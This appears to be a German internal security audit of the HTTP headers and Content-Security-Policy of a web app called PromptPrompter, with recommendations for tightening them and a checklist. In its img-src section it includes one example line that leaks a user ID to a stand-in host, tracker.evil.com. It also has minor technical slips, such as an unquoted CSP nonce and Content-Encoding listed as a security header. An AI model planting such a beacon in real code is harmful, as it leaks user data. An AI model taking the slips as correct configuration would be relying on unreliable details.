# Priority 2: Security Headers & Content-Security-Policy

**Status:** Audit in Bearbeitung  
**Datum:** 2026-08-16  
**Sicherheitsstufe:** HOCH

---

## Executive Summary

PromptPrompter hat bereits gute Security Headers konfiguriert, aber die CSP könnte restriktiver sein.

**Aktueller Status:**
- ✅ Alle 6 erforderlichen Security Headers sind konfiguriert
- ⚠️ CSP hat unnötige Wildcards
- ⚠️ `style-src 'unsafe-inline'` sollte überprüft werden
- ✅ HSTS und X-Frame-Options sind gut konfiguriert

---

## 1. Aktueller Header-Status

### 1.1 Strict-Transport-Security (HSTS)

**Aktuell:** ✅ KONFIGURIERT
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Analyse:**
- ✓ max-age=31536000 (1 Jahr) - sehr sicher
- ✓ includeSubDomains - schützt auch Subdomains
- ✓ Keine preload-Direktive (optional, aber könnte hinzugefügt werden)

**Empfehlung:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
Der `preload`-Directive würde die Domain in die HSTS-Preload-Liste aufnehmen.

---

### 1.2 X-Content-Type-Options

**Aktuell:** ✅ KONFIGURIERT
```
X-Content-Type-Options: nosniff
```

**Analyse:**
- ✓ Verhindert MIME-Type-Sniffing
- ✓ Browser respektiert Content-Type-Header
- ✓ Verhindert XSS-Attacken über falsche MIME-Types

**Bewertung:** ✅ SICHER - Keine Änderung erforderlich

---

### 1.3 Referrer-Policy

**Aktuell:** ✅ KONFIGURIERT
```
Referrer-Policy: strict-origin-when-cross-origin
```

**Analyse:**
- ✓ Sendet Referrer nur bei gleicher Domain
- ✓ Bei Cross-Origin: nur Origin (keine URL)
- ✓ Verhindert URL-Leaking zu Drittanbietern

**Bewertung:** ✅ SICHER - Angemessen für die App

---

### 1.4 X-Frame-Options

**Aktuell:** ✅ KONFIGURIERT
```
X-Frame-Options: DENY
```

**Analyse:**
- ✓ Verhindert Clickjacking
- ✓ Seite kann nicht in iframes eingebunden werden
- ✓ Strikte Sicherheit

**Bewertung:** ✅ SICHER - Keine Änderung erforderlich

---

### 1.5 Permissions-Policy

**Aktuell:** ✅ KONFIGURIERT
```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(self)
```

**Analyse:**
- ✓ Kamera ist deaktiviert
- ✓ Mikrofon ist deaktiviert
- ✓ Geolocation ist deaktiviert
- ✓ Payment nur aus gleichem Context

**Bewertung:** ✅ SICHER - Angemessen

**Empfehlung für Erweiterung:**
```
Permissions-Policy: 
  camera=(),
  microphone=(),
  geolocation=(),
  payment=(self),
  usb=(),
  magnetometer=(),
  gyroscope=(),
  accelerometer=(),
  ambient-light-sensor=()
```

---

### 1.6 Content-Security-Policy

**Aktuell:** ⚠️ KONFIGURIERT ABER NICHT OPTIMAL
```
default-src 'self';
script-src 'self' https://esm.sh;
worker-src 'self' blob: https://esm.sh;
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob: https:;
font-src 'self' data:;
connect-src 'self' https://*.supabase.co wss://*.supabase.co https://esm.sh https://api.stripe.com https://m.stripe.network;
frame-src 'self' https://*.vercel.run https://js.stripe.com https://stripe.com;
frame-ancestors 'none';
base-uri 'self';
form-action 'self' https://checkout.stripe.com;
object-src 'none';
upgrade-insecure-requests
```

**Probleme identifiziert:**

#### Problem 1: `style-src 'unsafe-inline'` ⚠️
**Zeile:** style-src

**Auswirkung:** Ermöglicht Inline-Style-Injection über XSS

**Grund:** Wahrscheinlich werden Styles dynamisch in die DOM eingefügt

**Empfehlung:**
1. Überprüfen wo Inline-Styles verwendet werden
2. CSS in separate Dateien verschieben
3. Oder Nonce verwenden:
   ```javascript
   // In Server: generiere zufälliges nonce
   const nonce = crypto.randomBytes(16).toString('hex');
   res.setHeader('Content-Security-Policy', `style-src 'nonce-${nonce}'`);
   
   // In HTML:
   <style nonce="${nonce}">/* ... */</style>
   ```

#### Problem 2: `img-src 'self' data: blob: https:` ⚠️
**Zeile:** img-src

**Auswirkung:** `https:` erlaubt bilder von JEDER HTTPS-Domain

**Beispiel:** Ein böses Skript könnte:
```javascript
// Tracker würde funktionieren
new Image().src = 'https://tracker.evil.com/?user=123';
```

**Empfehlung:**
```
img-src 'self' data: blob: https://*.supabase.co https://api.stripe.com;
```

#### Problem 3: `connect-src` hat Wildcards ⚠️
**Zeile:** connect-src

**Aktuell:**
```
connect-src 'self' https://*.supabase.co wss://*.supabase.co ...
```

**Besser:**
```
connect-src 'self' 
  https://wihdoacgqbyxxeejoxsg.supabase.co 
  wss://wihdoacgqbyxxeejoxsg.supabase.co
  https://esm.sh 
  https://api.stripe.com 
  https://m.stripe.network;
```

#### Problem 4: `frame-src` erlaubt mehrere Domains ⚠️
**Zeile:** frame-src

**Aktuell:**
```
frame-src 'self' https://*.vercel.run https://js.stripe.com https://stripe.com;
```

**Problem:** 
- Stripe.com ist zu breit
- Sollte auf js.stripe.com beschränkt sein
- Vercel.run Wildcard könnte eingeengt werden

**Besser:**
```
frame-src 'self' https://js.stripe.com https://checkout.stripe.com;
```

#### Problem 5: Kein `script-src-elem` oder Nonce ⚠️
**Issue:** Keine Unterscheidung zwischen inline-Scripts und externen

**Empfehlung:**
```
script-src 'self' https://esm.sh nonce-${nonce};
script-src-elem 'self' https://esm.sh;
```

---

## 2. CSP Verbesserungsplan

### Phase 1: Analyse (Jetzt)

**Überprüfung erforderlich:**

1. **Inline-Styles finden**
   ```bash
   grep -r "style=" --include="*.html" --include="*.js"
   ```

2. **Dynamische Styles erkennen**
   ```javascript
   // Überprüfen wo element.style.cssText = "..." aufgerufen wird
   grep -r "\.style\." --include="*.js"
   ```

3. **Externe Bilder überprüfen**
   ```javascript
   // Alle <img src="https://..." /> überprüfen
   grep -r "img src" --include="*.html"
   grep -r "\.src =" --include="*.js"
   ```

### Phase 2: Implementierung (in 1-2 Stunden)

**Neue CSP konfigurieren:**

```
default-src 'self';

script-src 'self' https://esm.sh;
script-src-elem 'self' https://esm.sh;

style-src 'self';
style-src-elem 'self';

img-src 'self' data: blob: https://*.supabase.co https://api.stripe.com;

font-src 'self' data:;

connect-src 'self' 
  https://wihdoacgqbyxxeejoxsg.supabase.co 
  wss://wihdoacgqbyxxeejoxsg.supabase.co
  https://esm.sh 
  https://api.stripe.com 
  https://m.stripe.network;

worker-src 'self' blob: https://esm.sh;

frame-src 'self' https://js.stripe.com https://checkout.stripe.com;

frame-ancestors 'none';

base-uri 'self';

form-action 'self' https://checkout.stripe.com;

object-src 'none';

upgrade-insecure-requests;
```

### Phase 3: Validierung

1. Lokal testen
2. Browser DevTools CSP-Fehler überprüfen
3. Staging-Umgebung testen
4. Production-Rollout

---

## 3. Weitere Security Headers zu überprüfen

### 3.1 Content-Encoding

**Empfehlung hinzufügen:**
```
Content-Encoding: gzip
Vary: Accept-Encoding
```

**Nutzen:** Komprimiert Responses

### 3.2 Cache-Control für Security-relevante Response

Diese sollten bereits via vercel.json konfiguriert sein:

```
Cache-Control: no-cache, no-store, must-revalidate
```

Für `/api/` Endpunkte: ✅ Konfiguriert

### 3.3 X-Permitted-Cross-Domain-Policies

**Optional hinzufügen:**
```
X-Permitted-Cross-Domain-Policies: none
```

Verhindert dass Flash/PDF die Seite als API nutzen.

---

## 4. CSP Testing Strategie

### 4.1 Browser DevTools

```javascript
// Öffne in Production:
// F12 → Console → Filtere nach CSP

// Sollte keine Fehler zeigen wie:
// "Refused to apply inline style..."
// "Refused to load image..."
```

### 4.2 CSP Report-Only Mode

**Vor Live-Deployment:**
```javascript
// Testen ohne zu blocken
Content-Security-Policy-Report-Only: ...
```

### 4.3 Sentry Integration

```javascript
// CSP-Fehler automatisch zu Sentry schicken
Content-Security-Policy: ...;report-uri /api/csp-report
```

---

## 5. Actionable Checklist

### Vor Production-Deployment

- [ ] Alle inline-Styles in styles.css verschieben
- [ ] Dynamische Styles mit Nonce generieren
- [ ] `img-src` auf bekannte Domains einengen
- [ ] `frame-src` auf only Stripe einschränken
- [ ] `connect-src` Wildcard entfernen
- [ ] HSTS preload-Direktive hinzufügen
- [ ] Permissions-Policy erweitern
- [ ] CSP in Report-Only Mode testen
- [ ] Browser-Tests durchführen

### Nach Production-Deployment

- [ ] CSP-Fehler in Sentry überprüfen
- [ ] Keine false positives?
- [ ] Performance OK?
- [ ] Nach 1 Woche zu full CSP (nicht Report-Only) wechseln

---

## 6. Implementation Timeline

| Phase | Aufgabe | Dauer | Priorität |
|-------|---------|-------|-----------|
| 1 | Inline-Styles finden | 30 min | HOCH |
| 2 | CSS-Refactoring | 1 Stunde | HOCH |
| 3 | CSP-Config updaten | 30 min | HOCH |
| 4 | Testing | 1 Stunde | HOCH |
| 5 | Report-Only Deployment | 15 min | HOCH |
| 6 | Monitoring | 1 Woche | MITTEL |
| 7 | Full Deployment | 15 min | MITTEL |

**Gesamtdauer:** ~4 Stunden

---

## Zusammenfassung

**Status Priority 2:** ⚠️ KONFIGURIERT aber VERBESSERUNGSBEDÜRFTIG

**Empfehlung:**
1. CSP restriktiver machen (Wildcards entfernen)
2. `unsafe-inline` Styles entfernen
3. Sentry Integration für CSP-Fehler
4. Report-Only Mode vor Live-Deployment

**Sicherheits-Score:** 7/10 (kann auf 9/10 verbessert werden)

---

**Nächster Schritt:** CSP-Konfiguration analysieren und testen

**Fällig:** Vor Production-Deployment (Priority 1 war Authorization, das ist done)
